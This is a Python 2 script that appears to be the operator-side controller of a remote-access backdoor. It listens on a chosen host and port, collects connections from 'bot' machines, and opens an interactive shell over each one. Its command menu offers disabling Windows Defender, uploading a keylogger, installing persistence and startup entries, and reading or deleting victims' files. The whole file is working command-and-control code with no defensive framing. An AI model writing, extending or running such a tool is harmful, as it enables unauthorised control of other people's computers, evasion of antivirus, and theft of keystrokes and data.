#coding:utf-8

import socket
import os
import subprocess
import time
from datetime import datetime
from platform import platform
from platform import system
from platform import version
from platform import machine
import urllib2
import json
import select
import shutil
import sys

s1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s1.connect(('8.8.8.8', 80))
returnlocalip = s1.getsockname()[0]

print('LOCAL IP : '+returnlocalip)
print
host = raw_input('[*] Enter LHOST > ')
print
port = input('[*] Enter LPORT > ')
print
clear=lambda:os.system('cls')
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host,port))
s.listen(10)
active=False
clients=[]
socks=[]
interval=0.8
print('Listening Session..Wait Moment..')

while True:
    try:
        s.settimeout(4)
        try:
            c,a=s.accept()
        except socket.timeout:
            continue
        
        if(a):
            c.settimeout(None)
            socks +=[c]
            clients +=[str(a)]
        clear()
        print '\nlistening for clients....\n'
        if len(clients)>0:
            for j in range(0,len(clients)):
                print '['+str((j+1))+']client:'+clients[j]+'\n'
            print 'press ctrl+C to interact with client.'
        time.sleep(interval)
    except KeyboardInterrupt:
        clear()
        print '\nlistening for clients....\n'
        if len(clients)>0:
            for j in range(0,len(clients)):
                print '['+str((j+1))+']client:'+clients[j]+'\n'
            print "[0] Exit \n"
            activate=input('[*] Enter Session  > ')
            if activate==0:
                print '\nExiting....\n'
                sys.exit()
            activate -=1
            clear()
            print'Session Bot'+clients[activate]+'\n'
            active=True
        while active:
            data=socks[activate].recv(16000)
            print data
            if data.startswith('quit')==True:
                active=False
                print('press ctrl+c to return to listener mode....')
            else:
                nextcmd=raw_input('shell~$ ')
                socks[activate].send(nextcmd)
            
            if nextcmd.startswith('cd')==True:
                path=nextcmd[3:]
            
            if nextcmd.startswith('rd')==True:
                file2=nextcmd[3:]
            
            if nextcmd.startswith('dl')==True:
                file3=nextcmd[3:]
            
            if nextcmd.startswith('mk')==True:
                file4=nextcmd[3:]
            
            if nextcmd.startswith('df')==True:
                file5=nextcmd[3:]
            
            if nextcmd.startswith('ec')==True:
                file6=nextcmd[3:]
            
            if nextcmd.startswith('dc')==True:
                file7=nextcmd[3:]
            
            if nextcmd.startswith('startup')==True:
                file8=nextcmd[3:]
            
            if nextcmd.startswith('ep')==True:
                path9=nextcmd[3:]
            
            if nextcmd.startswith('dp')==True:
                path10=nextcmd[3:]
            
            if nextcmd.startswith('pa')==True:
                path11=nextcmd[3:]
            
            if nextcmd.startswith('commands')==True:
                try:
                    print('[*] cd <path>      | shell commands')
                    print('[*] ipgeo          | return Geolocation')
                    print('[*] targetip       | return IP')
                    print('[*] sysinfo        | return system information')
                    print('[*] quit           | quit Session')
                    print('[*] viewtime       | Return Time')
                    print('[*] pwd            | return dirrectory')
                    print('[*] help           | show help shell commands')
                    print('[*] rd <file>      | read file')
                    print('[*] ec   <file>    | encrypt file base64')
                    print('[*] dc   <file>    | decrypt file base64')
                    print('[*] startup <file> | move backdoor on startup')
                    print('[*] dl <file>      | remove file')
                    print('[*] mk <folder>    | make folder')
                    print('[*] df <folder>    | delete folder')
                    print('[*] dir            | list dir')
                    print('[*] kav            | kill windows defender')
                    print('[*] uk             | Upload Keylogger')
                    print('[*] pe             | make persistance ')
                    print('[*] pa <path>      | check if path exists')

                except:
                    print('[*] Error Commands : commands')
    
    except:
        pass